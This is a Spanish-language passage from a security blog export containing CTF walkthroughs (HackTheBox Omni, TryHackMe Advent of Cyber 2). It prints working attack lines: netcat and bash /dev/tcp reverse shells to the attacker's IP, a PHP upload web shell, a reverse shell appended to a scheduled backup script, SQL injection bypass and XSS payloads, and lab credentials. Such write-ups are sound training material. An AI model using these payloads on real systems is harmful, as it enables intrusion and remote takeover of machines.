07/04/2020 07:28 PM \u0026lt;DIR\u0026gt; Videos 3 File(s) 4,160 bytes 9 Dir(s) 4,692,164,608 bytes free C:\\Data\\Users\u0026gt;cd app cd app C:\\Data\\Users\\app\u0026gt;type user.txt type user.txt \u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Management.Automation.PSCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.Management.Automation.PSCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;UserName\u0026#34;\u0026gt;flag\u0026lt;/S\u0026gt; \u0026lt;SS N=\u0026#34;Password\u0026#34;\u0026gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7\u0026lt;/SS\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt; C:\\Data\\Users\\app\u0026gt; C:\\Data\\Users\u0026gt;cd administrator cd administrator C:\\Data\\Users\\administrator\u0026gt;dir dir Volume in drive C is MainOS Volume Serial Number is 3C37-C677 Directory of C:\\Data\\Users\\administrator 07/04/2020 09:48 PM \u0026lt;DIR\u0026gt; . 07/04/2020 09:48 PM \u0026lt;DIR\u0026gt; .. 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; 3D Objects 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Documents 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Downloads 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Favorites 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Music 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Pictures 07/04/2020 09:48 PM 1,958 root.txt 07/03/2020 11:23 PM \u0026lt;DIR\u0026gt; Videos 1 File(s) 1,958 bytes 9 Dir(s) 4,692,164,608 bytes free C:\\Data\\Users\\administrator\u0026gt;type root.txt type root.txt \u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Management.Automation.PSCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.Management.Automation.PSCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;UserName\u0026#34;\u0026gt;flag\u0026lt;/S\u0026gt; \u0026lt;SS N=\u0026#34;Password\u0026#34;\u0026gt;01000000d08c9ddf0115d1118c7a00c04fc297eb0100000011d9a9af9398c648be30a7dd764d1f3a000000000200000000001066000000010000200000004f4016524600b3914d83c0f88322cbed77ed3e3477dfdc9df1a2a5822021439b000000000e8000000002000020000000dd198d09b343e3b6fcb9900b77eb64372126aea207594bbe5bb76bf6ac5b57f4500000002e94c4a2d8f0079b37b33a75c6ca83efadabe077816aa2221ff887feb2aa08500f3cf8d8c5b445ba2815c5e9424926fca73fb4462a6a706406e3fc0d148b798c71052fc82db4c4be29ca8f78f0233464400000008537cfaacb6f689ea353aa5b44592cd4963acbf5c2418c31a49bb5c0e76fcc3692adc330a85e8d8d856b62f35d8692437c2f1b40ebbf5971cd260f738dada1a7\u0026lt;/SS\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt; Intentamos obtener las flags pero no fue posible:\n1 2 3 4 5 6 7 8 9 10 11 12 PS C:\\Data\\Users\\app\u0026gt; $credential = Import-CliXml -Path U:\\Users\\app\\user.txt $credential = Import-CliXml -Path U:\\Users\\app\\user.txt Import-CliXml : Error occurred during a cryptographic operation. At line:1 char:15 + $credential = Import-CliXml -Path U:\\Users\\app\\user.txt + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : NotSpecified: (:) [Import-Clixml], Cryptographic Exception + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept ion,Microsoft.PowerShell.Commands.ImportClixmlCommand PS C:\\Data\\Users\\app\u0026gt; Encontramos un archivo el cual contiene unas credenciales del usuario app y Administrator:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 PS C:\\Program Files\\WindowsPowershell\\Modules\\PackageManagement\u0026gt; ls -force ls -force Directory: C:\\Program Files\\WindowsPowershell\\Modules\\PackageManagement Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 10/26/2018 11:37 PM 1.0.0.1 -a-h-- 8/21/2020 12:56 PM 247 r.bat PS C:\\Program Files\\WindowsPowershell\\Modules\\PackageManagement\u0026gt; type r.bat type r.bat @echo off :LOOP for /F \u0026#34;skip=6\u0026#34; %%i in (\u0026#39;net localgroup \u0026#34;administrators\u0026#34;\u0026#39;) do net localgroup \u0026#34;administrators\u0026#34; %%i /delete net user app mesh5143 net user administrator _1nt3rn37ofTh1nGz ping -n 3 127.0.0.1 cls GOTO :LOOP :EXIT PS C:\\Program Files\\WindowsPowershell\\Modules\\PackageManagement\u0026gt; Intentamos utilizar estas con EvilWinrm pero no fue posible ingresar por este servicio. Utilizamos las credenciales en la pagina y nos muestra un portal (Windows IoT Core) de administracion.\nAPP - USER Encontramos un apartado donde podemos realizar una ejecucion de comandos.\nEjecutamos una shell inversa para tener acceso con el usuario app.\n1 powershell -c \u0026#34;\u0026amp; { iwr 10.10.14.44/nc64.exe -OutFile C:\\Data\\Users\\app\\nc64.exe}\u0026#34; \u0026amp; powershell -c C:\\Data\\Users\\app\\nc64.exe -e cmd.exe 10.10.14.44 1335 La primera vez al ejecutar la lectura de la flag nos dio error por lo que tuvimos que verificar el disco duro el cual no era C si no U.\n1 2 3 4 5 6 7 8 9 10 11 12 13 PS C:\\Data\\Users\\app\u0026gt; $credential = Import-CliXml -Path C:\\Users\\app\\user.txt $credential = Import-CliXml -Path C:\\Users\\app\\user.txt Import-CliXml : Could not find a part of the path \u0026#39;C:\\Users\\app\\user.txt\u0026#39;. At line:1 char:15 + $credential = Import-CliXml -Path C:\\Users\\app\\user.txt + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : OpenError: (:) [Import-Clixml], DirectoryNotFoun dException + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.Im portClixmlCommand PS C:\\Data\\Users\\app\u0026gt; Ejecutamos y leemos nuestra flag.\n1 2 3 4 5 PS C:\\Data\\Users\\app\u0026gt; $credential = Import-CliXml -Path U:\\Users\\app\\user.txt $credential = Import-CliXml -Path U:\\Users\\app\\user.txt PS C:\\Data\\Users\\app\u0026gt; $credential.GetNetworkCredential().Password $credential.GetNetworkCredential().Password 7cfd50[... REDACTED ...]05ad9d70 ADMINISTRATOR - USER Ahora ejecutamos una shell inversa con el usuario Administrador y de la misma forma logramos obtener la flag root.txt.\n1 2 3 4 PS C:\\Data\\Users\\administrator\u0026gt; $credential = Import-CliXml -Path U:\\Users\\administrator\\root.txt PS C:\\Data\\Users\\administrator\u0026gt; $credential.GetNetworkCredential().Password 5dbd[... REDACTED ...]6e9bf11d PS C:\\Data\\Users\\administrator\u0026gt; ","description":"Omni es una maquina de HackTheBox diferente ya que encontramos un SO Windows IOT, descubrimos que existe una vulnerabilidad la cual aprovechamso para ejecutar una shell inversa. Enumerando diferentes archivos encontramos credenciales almacenadas que nos permitieron ingresar al Portal y obtener acceso privilegiado.","id":81,"section":"posts","tags":["sireprat"],"title":"Hack The Box - Omni","uri":"https://sckull.github.io/posts/omni/"},{"content":"\rAdvent of Cyber 2 de TryHackMe contiene una serie de retos orientados al aprendizaje de herramientas y conceptos de seguridad, liberados diariamente durante 25 dias.\nInformacion Titulo Advent of Cyber 2 Room Advent of Cyber 2 Info Get started with Cyber Security in 25 Days - Learn the basics by doing a new, beginner friendly security challenge every day leading up to Christmas. Maker TryHackMe \u0026amp; cmnatic \u0026amp; DarkStar7471 \u0026amp; JohnHammond \u0026amp; Tib3rius \u0026amp; TCM URL TryHackMe - AoC2 DAY 1 - Web Exploitation Presentan una web donde es necesario crear una cuenta y obtener diferentes valores.\nPrimero es necesario crear una cuenta, luego de eso ingresar con las credenciales, y con la herramienta para desarrolladores de firefox obtenemos la cookie y el nombre de la misma.\n1 auth:7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a22757365726e616d65227d Utilizando CyberCheff logramos obtener el valor real de la cookie el cual esta codificado en hexadecimal y esta en formato json.\n1 {\u0026#34;company\u0026#34;:\u0026#34;The Best Festival Company\u0026#34;, \u0026#34;username\u0026#34;:\u0026#34;username\u0026#34;} Para poder realizar un \u0026ldquo;bypass\u0026rdquo; utilizamos el formato de la cookie y la codificacion utilizada, pasandole como usuario santa y codificandola nuevamente.\n1 2 {\u0026#34;company\u0026#34;:\u0026#34;The Best Festival Company\u0026#34;, \u0026#34;username\u0026#34;:\u0026#34;santa\u0026#34;} 7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d Utilizando nuevamente la herramienta para desarrolladores de firefox en la seccion de Storage \u0026gt; Cookies, creamos una nueva cookie con los valores:\n1 2 Name: auth value: 7b22636f6d70616e79223a22546865204265737420466573746976616c20436f6d70616e79222c2022757365726e616d65223a2273616e7461227d Al recargar la pagina nos muestra las opciones pero en esta ocacion podemos activar todas y obtener nuestra flag.\nDAY 2 - Web Exploitation Presentan un reto del tipo web donde nos dan un ID para auditar la aplicacion. Además se presenta un mensaje que indica que debemos de pasar el ID al parametro ?id= a la aplicacion\n1 2 3 For Elf McEager: You have been assigned an ID number for your audit of the system: ODIzODI5MTNiYmYw . Use this to gain access to the upload section of the site. Good luck! Al pasarle el valor (/?id=ODIzODI5MTNiYmYw) nos muestra una pagina nueva que permite seleccionar un archivo ha subir.\nEn el codigo fuente de la pagina se muestra las extensiones aceptadas (.jpeg,.jpg,.png) de los archivos.\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;body\u0026gt; \u0026lt;ul class=\u0026#34;lightrope\u0026#34;\u0026gt;\u0026lt;li\u0026gt;[... snip ...]\u0026lt;/li\u0026gt;\u0026lt;/ul\u0026gt; \u0026lt;div class=nose\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;main\u0026gt; \u0026lt;h1\u0026gt;Protect the Factory!\u0026lt;/h1\u0026gt; \u0026lt;h2\u0026gt;If you see any suspicious people near the factory, take a picture and upload it here!\u0026lt;/h2\u0026gt; \u0026lt;input type=file id=\u0026#34;chooseFile\u0026#34; accept=\u0026#34;.jpeg,.jpg,.png\u0026#34;\u0026gt; \u0026lt;button tabindex=0 id=coverFile\u0026gt;Select\u0026lt;/button\u0026gt; \u0026lt;button tabindex=1 id=uploadFile\u0026gt;Submit\u0026lt;/button\u0026gt; \u0026lt;p id=fileText\u0026gt;No file selected\u0026lt;/p\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; Al subir una imagen la pagina no muestra ningun mensaje de la direccion donde está almacenada, utilizando la descripcion de File Uploads logramos encontrar la direccion donde se encuentra nuestra imagen.\nPara obtener nuestra flag creamos un archivo que contiene codigo en PHP para poder ejecutar una shell inversa.\n1 2 kali@kali:~/thm/adventcyber2$ cat shell.jpg.php \u0026lt;?php exec(\u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1\u0026#39;); ?\u0026gt; Con netcat a la escucha (rlwrap nc -lvp 1338), subimos nuestro archivo y visitamos el mismo como si fuera un pagina normal, lo cual ejecuto nuestra shell inversa y logramos obtener una shell y nuestra flag.\nDAY 3 - Web Exploitation Nos presentan una pagina a la cual hay que realizar un ataque de fuerza bruta utilizando la herramienta Burpsuite tal y como se presenta en la descripcion del reto. Tambien proveen una lista de usuarios y contraseñas.\n1 2 3 4 Usuario Contraseña root root admin password user 12345 Para realizar el ataque lo hacemos con la extension FoxyProxy o directamente en la configuracion de firefox para dirigir el trafico a Burpsuite mediante su proxy, y con esta herramienta poder manipular los parametros de interes.\nPrimero debemos de enviar un usuario y contraseña, al realizar esto, en burpsuite nos muestra la solicitud a realizar donde vemos los valores enviados. Esta solicitud la enviamos al Intruder donde se muestran las posiciones del usuario y contraseña las cuales son marcadas para poder utilizar y cambiar los diferentes valores de un diccionario en cada solicitud.\nEn la ventana de Payloads pegamos para el primer parametro (usuario, payload set = 1) la lista dada o en el caso de que esté en un archivo se carga el mismo. Se configura el segundo parametro (contraseña, payload set = 1 ) y se cargan la lista o archivo, al tener estos valores configurados se lanza el ataque (En caso de que sea la version gratuita de burpsuite solo configurar una posicion e intercambiar el nombre de usuario o contraseña manualmente, al ser una lista pequeña no toma mucho tiempo). Al finalizar se muestra la lista de solicitudes, en una de ellas se muestra un mensaje diferente a los demas, donde indica que se encontró la contraseña.\nUtilizamos usuario y contraseña encontrado para obtener nuestra flag en la pagina.\nDAY 4 - Web Exploitation Este dia presentan un reto web que incluye la explicacion del uso de herramientas WFUZZ y GOBUSTER para realizar fuzzing en paginas web. Tambien presentan que el parametro (date) del reto toma como valor una fecha en el formato YYYYMMDD.\nPara obtener la flag, primero es necesario ejecutar gobuster a la pagina web con el diccionario big.txt el cual nos muestra como resultado una direccion donde se encuentra una pagina web.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 kali@kali:~/thm/adventcyber2$ gobuster dir -u http://10.10.57.57/ -w /usr/share/wordlists/dirb/big.txt =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://10.10.57.57/ [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirb/big.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Timeout: 10s =============================================================== 2020/12/12 13:37:27 Starting gobuster =============================================================== /.htpasswd (Status: 403) /.htaccess (Status: 403) /LICENSE (Status: 200) /api (Status: 301) /server-status (Status: 403) =============================================================== 2020/12/12 13:50:52 Finished =============================================================== A dicha pagina web es necesario realizar fuzzing al parametro date para ello debemos de utilizar algun diccionario que contenga el formato YYYYMMDD, en este caso utilizamos python para generar nuestro diccionario en el formato presentado especificando año, mes y dia.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #!/usr/bin/env python for i in range(1990, 2021): for j in range(1,13): for k in range(1,32):\ty = str(i) m = \u0026#39;0\u0026#39; + str(j) if j \u0026lt; 10 else str(j) d = \u0026#39;0\u0026#39; + str(k) if k \u0026lt; 10 else str(k)\tprint(y+m+d) i+=1 j+=1 k+=1 # python dates.py \u0026gt; dates.txt Utilizamos WFUZZ para pasarle los valores del diccionario al parametro date y ocultamos todas las solicitudes que tuvieran 0 caracteres (--hh 0), logrando obtener la fecha en donde se presenta nuestra flag.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 kali@kali:~/thm/adventcyber2$ wfuzz -c -z file,dates.txt --hh 0 http://10.10.57.57/api/site-log.php?date=FUZZ Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 2.4.5 - The Web Fuzzer * ******************************************************** Target: http://10.10.57.57/api/site-log.php?date=FUZZ Total requests: 11532 =================================================================== ID Response Lines Word Chars Payload =================================================================== 000011495: 200 0 L 1 W 13 Ch \u0026#34;20201125\u0026#34; Total time: 419.2043 Processed Requests: 11532 Filtered Requests: 11531 Requests/sec.: 27.50925 DAY 5 - Web Exploitation Se presenta una aplicacion web vulnerable a SQLi de la cual nos dan la \u0026ldquo;documentacion\u0026rdquo;:\nSanta\u0026rsquo;s TODO: Look at alternative database systems that are better than sqlite. Also, don\u0026rsquo;t forget that you installed a Web Application Firewall (WAF) after last year\u0026rsquo;s attack. In case you\u0026rsquo;ve forgotten the command, you can tell SQLMap to try and bypass the WAF by using \u0026ndash;tamper=space2comment\nEn la primera tarea preguntan por el panel de logeo, la pista dada es suficiente para obtener la respuesta. En el panel realizamos \u0026ldquo;bypass\u0026rdquo; utilizando el payload ' or true; -- en el campo de username.\nDentro de la aplicacion enviamos el payload ' ORDER BY 1-- el cual hizo retornar los valores de la base de datos.\nUtilizando SQLMAP y Burpsuite para obtener los datos de la base de datos tal y como se explica en la descripcion del reto de este dia, tomando en cuenta que la aplicacion cuenta con un WAF utilizamos un tamper para \u0026ldquo;camuflar\u0026rdquo; los payloads y como base de datos se especifica que es sqlite como lo indica la \u0026ldquo;documentacion\u0026rdquo;.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 #sqlmap -r santaspanel.txt --dbms=sqlite --tamper=space2comment --dump-all Database: SQLite_masterdb Table: users [1 entry] +------------------+----------+ | password | username | +------------------+----------+ | EhCNSWzzFP6sc7gB | admin | +------------------+----------+ Database: SQLite_masterdb Table: sequels [22 entries] +-------------+-----+----------------------------+ | kid | age | title | +-------------+-----+----------------------------+ | James | 8 | shoes | | John | 4 | skateboard | | Robert | 17 | iphone | | Michael | 5 | playstation | | William | 6 | xbox | | David | 6 | candy | | Richard | 9 | books | | Joseph | 7 | socks | | Thomas | 10 | 10 McDonalds meals | | Charles | 3 | toy car | | Christopher | 8 | air hockey table | | Daniel | 12 | lego star wars | | Matthew | 15 | bike | | Anthony | 3 | table tennis | | Donald | 4 | fazer chocolate | | Mark | 17 | wii | | Paul | 9 | github ownership | | James | 8 | finnish-english dictionary | | Steven | 11 | laptop | | Andrew | 16 | rasberry pie | | Kenneth | 19 | TryHackMe Sub | | Joshua | 12 | chair | +-------------+-----+----------------------------+ Database: SQLite_masterdb Table: hidden_table [1 entry] +-----------------------------------------+ | flag | +-----------------------------------------+ | thmfox{All_I_Want_for_Christmas_Is_You} | +-----------------------------------------+ DAY 6 - Web Exploitation La aplicacion dada es vulnerable a XSS y utilizando OWASP ZAP es posible obtener las diferentes alertas de XSS. Para responder las preguntas de este reto es necesario explotar el campo New Book... y utilizar OWASP ZAP.\n1 \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; DAY 7 - Networking Se un archivo comprimido con varios archivos de captura de paquetes a los cuales hay que realizar un analisis utilizando wireshark y los filtros descritos y explicados en la descripcion del reto del dia.\nLa IP que realiza ping (archivo: pcap1.pcap).\nPost Visitado por la ip 10.10.67.199 utilizando el filtro http.request.method == GET, tambien se puede incluir la ip en el filtro http.request.method == GET \u0026amp;\u0026amp; ip.src == 10.10.67.199 (archivo: pcap1.pcap).\nUtilizando el filtro tcp.port==21 para las peticiones en el puerto 21 de FTP y leer la contraseña (archivo: pcap2.pcap).\nProtocolo encriptado: SSH (archivo: pcap2.pcap).\nQue hay en la lista de deseos de Elf McSkidy, exportando los archivos (objetos) en el protocolo HTTP (archivo: pcap3.pcap).\nDAY 8 - Networking Se presenta una IP en la cual hay que realizar un escaneo de puertos, sistema operativo y ejecutar scripts con nmap. Tambien una serie de preguntas relacionada a sintaxis e informacion obtenida.\nCreacion de Snort: Snort\nPuertos abiertos con un simple scan.\n1 2 3 4 5 6 7 8 9 10 11 #nmap tbfc.blog Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-14 11:07 EST Nmap scan report for tbfc.blog (10.10.1.235) Host is up (0.32s latency). Not shown: 997 closed ports PORT STATE SERVICE 80/tcp open http 2222/tcp open EtherNetIP-1 3389/tcp open ms-wbt-server Nmap done: 1 IP address (1 host up) scanned in 26.97 seconds Determinar el Sistema operativo: nmap -O tbfc.blog\nDeterminar para que esta oreintada la Aplicacion web con el script http-title: blog.\n1 2 3 4 5 6 7 8 9 10 kali@kali:~/thm/adventcyber2$ nmap --script http-title -p 80 tbfc.blog Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-14 11:12 EST Nmap scan report for tbfc.blog (10.10.1.235) Host is up (0.79s latency). PORT STATE SERVICE 80/tcp open http |_http-title: TBFC\u0026amp;#39;s Internal Blog Nmap done: 1 IP address (1 host up) scanned in 3.74 seconds DAY 9 - Networking Un servicio FTP esta expuesto en la IP del reto en la cual se ingresa como \u0026ldquo;anonymous\u0026rdquo;, la descripcion del reto dá suficiente informacion para resolver cada una de las tareas y obtener la flag. En la primera pestaña tenemos la conexion con el servicio donde logramos obtener el archivo backup.sh y shoppinglist.txt, el archivo backup se ejecuta cada cierto tiempo, agregamos una shell inversa y volvimos a subir el archivo en el servicio FTP, con netcat a la escucha logramos obtener una shell y nuestra flag root.txt.\nbash\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 kali@kali:~/thm/adventcyber2$ ftp 10.10.99.86 Connected to 10.10.99.86. 220 Welcome to the TBFC FTP Server!. Name (10.10.99.86:kali): anonymous 230 Login successful. Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 6 65534 65534 4096 Nov 16 15:06 . drwxr-xr-x 6 65534 65534 4096 Nov 16 15:06 .. drwxr-xr-x 2 0 0 4096 Nov 16 15:04 backups drwxr-xr-x 2 0 0 4096 Nov 16 15:05 elf_workshops drwxr-xr-x 2 0 0 4096 Nov 16 15:04 human_resources drwxrwxrwx 2 65534 65534 4096 Nov 16 19:35 public 226 Directory send OK. ftp\u0026gt; cd public 250 Directory successfully changed. ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 2 65534 65534 4096 Nov 16 19:35 . drwxr-xr-x 6 65534 65534 4096 Nov 16 15:06 .. -rwxr-xr-x 1 111 113 341 Nov 16 19:34 backup.sh -rw-rw-rw- 1 111 113 24 Nov 16 19:35 shoppinglist.txt 226 Directory send OK. ftp\u0026gt; get backup.sh local: backup.sh remote: backup.sh 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for backup.sh (341 bytes). 226 Transfer complete. 341 bytes received in 0.00 secs (660.7298 kB/s) ftp\u0026gt; get shoppinglist.txt local: shoppinglist.txt remote: shoppinglist.txt 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for shoppinglist.txt (24 bytes). 226 Transfer complete. 24 bytes received in 0.00 secs (181.6861 kB/s) ftp\u0026gt; put backup.sh local: backup.sh remote: backup.sh 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 383 bytes sent in 0.00 secs (1.6603 MB/s) ftp\u0026gt; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 kali@kali:~/thm/adventcyber2$ cat backup.sh #!/bin/bash # Created by ElfMcEager to backup all of Santa\u0026#39;s goodies! # Create backups to include date DD/MM/YYYY filename=\u0026#34;backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz\u0026#34;; # Backup FTP folder and store in elfmceager\u0026#39;s home directory tar -zcvf /home/elfmceager/$filename /opt/ftp # TO-DO: Automate transfer of backups to backup server kali@kali:~/thm/adventcyber2$ cat shoppinglist.txt The Polar Express Movie kali@kali:~/thm/adventcyber2$ echo \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt;\u0026gt; backup.sh kali@kali:~/thm/adventcyber2$ tail backup.sh # Create backups to include date DD/MM/YYYY filename=\u0026#34;backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz\u0026#34;; # Backup FTP folder and store in elfmceager\u0026#39;s home directory tar -zcvf /home/elfmceager/$filename /opt/ftp # TO-DO: Automate transfer of backups to backup server bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.10.10/1338 0\u0026gt;\u0026amp;1 kali@kali:~/thm/adventcyber2$ DAY 10 - Networking Un servicio SAMBA esta expuesto en la IP del reto, la descripcion del reto dá suficiente informacion para resolver cada una de las tareas con las herramientas enum4linux y smbclient. Se realiza un escaneo con enum4linux para busqueda de nombres de usuarios y SHARENAMES con los cuales verificamos en cual de estos SHARENAMES permite entrar sin ninguna credencial.\nbash\rbash\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 kali@kali:~/thm/adventcyber2$ enum4linux -S -U 10.10.77.26 2\u0026gt;/dev/null Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Dec 14 11:45:44 2020 [... snip ...] ========================================== | Getting domain SID for 10.10.77.26 | ========================================== Domain Name: TBFC-SMB-01 Domain Sid: (NULL SID) [+] Can\u0026#39;t determine if host is part of domain or part of a workgroup ============================ | Users on 10.10.77.26 | ============================ index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy Name: Desc: index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager Name: elfmceager Desc: index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson Name: Desc: user:[elfmcskidy] rid:[0x3e8] user:[elfmceager] rid:[0x3ea] user:[elfmcelferson] rid:[0x3e9] ======================================== | Share Enumeration on 10.10.77.26 | ======================================== Sharename Type Comment --------- ---- ------- tbfc-hr Disk tbfc-hr tbfc-it Disk tbfc-it tbfc-santa Disk tbfc-santa IPC$ IPC IPC Service (tbfc-smb server (Samba, Ubuntu)) SMB1 disabled -- no workgroup available [+] Attempting to map shares on 10.10.77.26 //10.10.77.26/tbfc-hr Mapping: DENIED, Listing: N/A //10.10.77.26/tbfc-it Mapping: DENIED, Listing: N/A //10.10.77.26/tbfc-santa Mapping: OK, Listing: OK //10.10.77.26/IPC$ [E] Can\u0026#39;t understand response: NT_STATUS_OBJECT_NAME_NOT_FOUND listing \\* enum4linux complete on Mon Dec 14 11:46:32 2020 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 kali@kali:~/thm/adventcyber2$ smbclient \\\\\\\\10.10.77.26\\\\tbfc-hr Enter WORKGROUP\\kali\u0026#39;s password: tree connect failed: NT_STATUS_ACCESS_DENIED kali@kali:~/thm/adventcyber2$ smbclient \\\\\\\\10.10.77.26\\\\tbfc-it Enter WORKGROUP\\kali\u0026#39;s password: tree connect failed: NT_STATUS_ACCESS_DENIED kali@kali:~/thm/adventcyber2$ smbclient \\\\\\\\10.10.77.26\\\\tbfc-santa Enter WORKGROUP\\kali\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Wed Nov 11 21:12:07 2020 .. D 0 Wed Nov 11 20:32:21 2020 jingle-tunes D 0 Wed Nov 11 21:10:41 2020 note_from_mcskidy.txt N 143 Wed Nov 11 21:12:07 2020 10252564 blocks of size 1024. 5368116 blocks available smb: \\\u0026gt; get note_from_mcskidy.txt getting file \\note_from_mcskidy.txt of size 143 as note_from_mcskidy.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) smb: \\\u0026gt; cd jingle-tunes smb: \\jingle-tunes\\\u0026gt; ls . D 0 Wed Nov 11 21:10:41 2020 .. D 0 Wed Nov 11 21:12:07 2020 10252564 blocks of size 1024. 5368116 blocks available smb: \\jingle-tunes\\\u0026gt; exit kali@kali:~/thm/adventcyber2$ cat note_from_mcskidy.txt Hi Santa, I decided to put all of your favourite jingles onto this share - allowing you access it from anywhere you like! Regards ~ ElfMcSkidy kali@kali:~/thm/adventcyber2$ DAY 11 - Networking Se presenta una maquina en la cual tenemos acceso y es necesario escalar privilegios utilizando los \u0026ldquo;comandos/guias\u0026rdquo; de GTFObins. Con la informacion descrita en el reto del dia es suficiente para resolver las tareas y obtener la flag. Enumeracion de archivos con permisos SUID.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 -bash-4.4$ find / -perm -4000 2\u0026gt; /dev/null | xargs ls -lah -rwsr-xr-x 1 root root 1.1M Jun 6 2019 /bin/bash -rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount -rwsr-xr-x 1 root root 43K Sep 16 18:43 /bin/mount -rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping -rwsr-xr-x 1 root root 44K Mar 22 2019 /bin/su -rwsr-xr-x 1 root root 27K Sep 16 18:43 /bin/umount ... snap stuff 